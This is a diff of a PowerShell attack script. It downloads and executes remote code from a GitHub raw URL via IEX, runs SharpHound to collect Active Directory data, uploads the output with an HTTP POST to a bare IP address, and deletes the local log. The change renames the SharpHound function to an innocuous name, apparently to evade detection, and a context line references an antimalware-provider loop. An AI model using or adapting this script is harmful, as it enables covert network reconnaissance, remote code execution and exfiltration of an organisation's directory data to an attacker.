@@ -38,7 +38,7 @@ while ($AntimalwareProvider -ne 0)
 
 $currentPath = (Get-Item -Path ".\" -Verbose).FullName
 IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mariffy/nota-buku/main/Invoke-Testing1SubFunc.ps1')
-$sharphoundOutput = Invoke-Sharphound4 -command "-c All,GPOLocalGroup --OutputDirectory $currentPath"
+$sharphoundOutput = Invoke-Testing1SubFunc -command "-c All,GPOLocalGroup --OutputDirectory $currentPath"
 $sharphoundOutput | Out-File -FilePath "log.txt" -Encoding UTF8
 Invoke-WebRequest -Uri "http://18.134.172.169/29622395-3621-4094-996b-1fd1ca730297.php" -Method POST -ContentType 'text/plain' -InFile "log.txt"
 Remove-Item -Path "log.txt"
